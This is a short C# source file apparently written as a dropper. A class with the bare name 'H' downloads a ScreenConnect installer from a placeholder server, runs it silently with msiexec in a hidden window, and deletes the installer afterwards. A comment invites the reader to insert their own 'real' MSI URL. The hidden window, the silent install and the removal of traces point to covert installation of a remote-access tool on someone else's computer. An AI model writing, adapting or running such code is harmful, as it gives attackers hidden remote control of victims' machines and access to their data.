using System;
using System.Diagnostics;
using System.Net;

public class H
{
    public static void Exec()
    {
        // === CHANGE THIS URL TO YOUR REAL SCREENCONNECT MSI ===
        string url = "https://your-server.com/ScreenConnect.ClientSetup.msi";
        string path = @"C:\Windows\Temp\sc.msi";

        // Download
        using (WebClient wc = new WebClient())
        {
            wc.DownloadFile(url, path);
        }

        // Silent install
        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = "msiexec.exe",
            Arguments = "/i \"" + path + "\" /quiet /qn",
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true
        };
        Process p = Process.Start(psi);
        p.WaitForExit();

        // Cleanup
        System.IO.File.Delete(path);
    }
}
